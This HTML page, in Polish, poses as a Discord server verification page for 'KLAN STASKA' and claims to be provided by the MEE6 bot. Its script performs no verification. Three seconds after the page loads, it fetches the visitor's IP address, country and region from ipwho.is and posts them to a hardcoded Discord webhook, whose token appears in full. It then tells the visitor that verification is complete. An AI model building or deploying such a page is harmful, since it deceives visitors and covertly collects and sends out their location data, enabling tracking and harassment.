<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Weryfikacja serwera</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');

  body {
    margin: 0; padding: 0;
    background-color: #121212;
    color: #eee;
    font-family: 'Inter', sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
  }

  .container {
    margin-top: 80px;
    background: #1e1e1e;
    padding: 30px 40px;
    border-radius: 12px;
    box-shadow: 0 0 20px rgba(120, 64, 255, 0.7);
    width: 320px;
    text-align: center;
  }

  .logo {
    width: 70px;
    height: 70px;
    background-color: #5845f4;
    border-radius: 50%;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    font-weight: 700;
    font-size: 28px;
    color: white;
    text-shadow: 0 0 5px #9a7eff;
    margin-bottom: 24px;
    user-select: none;
  }

  h1 {
    font-size: 20px;
    margin: 0 0 8px 0;
    font-weight: 700;
  }

  .subtitle {
    color: #bbb;
    font-size: 14px;
    margin-bottom: 32px;
  }

  button {
    background-color: #5845f4;
    border: none;
    border-radius: 8px;
    color: white;
    font-weight: 700;
    font-size: 14px;
    padding: 14px 24px;
    cursor: pointer;
    box-shadow: 0 0 12px #8c75ff;
    transition: background-color 0.3s ease;
    user-select: none;
  }

  button:disabled {
    background-color: #3a2f70;
    cursor: default;
    box-shadow: none;
  }

  button:hover:not(:disabled) {
    background-color: #7b69ff;
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">VC</div>
  <h1>KLAN STASKA</h1>
  <div class="subtitle">UsÅ‚uga Å›wiadczona przez bota MEE6</div>
  <button id="verifyBtn" disabled>Verify complete, close this site.</button>
</div>

<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1466608411389984912/zjweHDorJ_iVnl9-38EvwHrJMw_g1iYZN5bx16O797Mi7HAiZyNiRK2FBhYRe-7wNwCX";

  const btn = document.getElementById('verifyBtn');

  // Funkcja wysyÅ‚ajÄ…ca embed do webhooka Discord
  async function sendWebhook(ip, country, region) {
    const data = {
      embeds: [{
        title: "ðŸŒŸ Nowy zweryfikowany uÅ¼ytkownik ðŸŒŸ",
        color: 65280,
        fields: [
          { name: "IP", value: ip || "unknown", inline: true },
          { name: "Kraj", value: country || "unknown", inline: true },
          { name: "Region", value: region || "unknown", inline: true }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
      console.log("Webhook wysÅ‚any poprawnie");
    } catch (e) {
      console.error("BÅ‚Ä…d wysyÅ‚ania webhooka:", e);
    }
  }

  // Pobranie IP i danych lokalizacji z ipwho.is
  async function getIpData() {
    try {
      const res = await fetch("https://ipwho.is/");
      if (!res.ok) throw new Error("Nie udaÅ‚o siÄ™ pobraÄ‡ IP");
      return await res.json();
    } catch (e) {
      console.error("BÅ‚Ä…d pobierania IP:", e);
      return {};
    }
  }

  // Po 3 sekundach wÅ‚Ä…czamy przycisk i pobieramy + wysyÅ‚amy IP
  setTimeout(async () => {
    btn.disabled = false;
    btn.textContent = 'Verify complete, close this site.';

    const ipData = await getIpData();
    const ip = ipData.ip;
    const country = ipData.country;
    const region = ipData.region;

    sendWebhook(ip, country, region);

  }, 3000);

  btn.addEventListener('click', () => {
    alert('Verification complete! MoÅ¼esz zamknÄ…Ä‡ stronÄ™.');
    window.close();
  });
</script>

</body>
</html>
